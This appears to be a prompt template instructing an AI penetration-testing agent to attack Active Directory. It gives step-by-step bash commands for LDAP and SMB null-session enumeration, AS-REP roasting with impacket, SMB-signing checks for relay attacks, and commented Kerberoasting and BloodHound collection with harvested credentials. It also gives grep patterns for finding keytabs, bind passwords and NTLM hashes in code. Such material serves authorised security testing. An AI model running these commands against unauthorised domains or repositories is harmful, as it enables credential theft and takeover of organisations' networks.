<scope>
Focus on Active Directory attack vectors accessible from the network:

**Enumeration (unauthenticated):**
- Domain and forest structure via LDAP null bind
- User and computer enumeration via SMB null session
- AS-REP roasting (accounts with pre-auth disabled)
- SMB signing configuration

**Authenticated attacks (if credentials available from cred-intel or other agents):**
- Kerberoasting (accounts with SPNs)
- BloodHound path collection
- Pass-the-hash / Pass-the-ticket
- DCSync (if domain admin access)
- ACL abuse: GenericWrite, WriteDACL, WriteOwner
- Group Policy misconfiguration

**IaC/Code Analysis:**
- Hardcoded domain credentials in source code
- Service account passwords in config files
- Kerberos keytabs or NTLM hashes in repository
</scope>

<systematic_approach>
**Step 1 — Domain Discovery**
```bash
TARGET_IP=$(dig +short $(echo "{{WEB_URL}}" | sed 's|https\?://||' | cut -d/ -f1) 2>/dev/null | head -1)
echo "Target IP: $TARGET_IP"

# SMB enumeration (null session)
enum4linux-ng -A "$TARGET_IP" 2>/dev/null | head -80

# LDAP anonymous bind
ldapsearch -x -H "ldap://$TARGET_IP" -b "" -s base namingContexts 2>/dev/null | head -20
```

**Step 2 — AS-REP Roasting (No credentials required)**
```bash
# Extract domain from LDAP
DOMAIN=$(ldapsearch -x -H "ldap://$TARGET_IP" -b "" -s base 2>/dev/null | grep defaultNamingContext | head -1 | sed 's/.*DC=//;s/,DC=././g')
echo "Domain: $DOMAIN"

# AS-REP Roasting — targets accounts with "Do not require Kerberos preauthentication"
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
  "$DOMAIN/" -no-pass -usersfile /dev/stdin <<< "" \
  -dc-ip "$TARGET_IP" 2>&1 | grep -v "[-]" | head -30
```

**Step 3 — SMB Enumeration**
```bash
# Check SMB signing (required for relay attacks)
nmap --script smb2-security-mode -p 445 "$TARGET_IP" 2>/dev/null | grep -i "signing\|message"

# Enumerate shares (null session)
smbclient -L "//$TARGET_IP" -N 2>/dev/null | head -20

# CrackMapExec enumeration
crackmapexec smb "$TARGET_IP" 2>/dev/null | head -10
```

**Step 4 — Kerberoasting (requires credentials)**
```bash
# Only if credentials were found by cred-intel agent
# python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
#   "$DOMAIN/USERNAME:PASSWORD" -dc-ip "$TARGET_IP" -request 2>&1 | head -30
```

**Step 5 — IaC Credential Scan**
```bash
# Search for AD credentials and Kerberos material in source code
grep -rn 'krb5.keytab\|KERBEROS\|AD_PASSWORD\|LDAP_BIND_DN\|LDAP_BIND_PASSWORD\|bindPassword\|bind_dn' \
  {{REPO_PATH}} 2>/dev/null | grep -v ".git\|node_modules" | head -20

# Find hardcoded NTLM hashes (32 char hex)
grep -rn '[0-9a-fA-F]\{32\}:[0-9a-fA-F]\{32\}' \
  {{REPO_PATH}} --include="*.env*" --include="*.conf" --include="*.yaml" 2>/dev/null \
  | grep -v ".git" | head -10
```

**Step 6 — BloodHound Collection** (if domain access available)
```bash
# Only if domain credentials were found
# bloodhound-python -u USERNAME -p PASSWORD -d "$DOMAIN" -c All \
#   -dc "$TARGET_IP" --zip -o {{REPO_PATH}}/.vanguard/scratchpad/ 2>&1 | tail -10
```
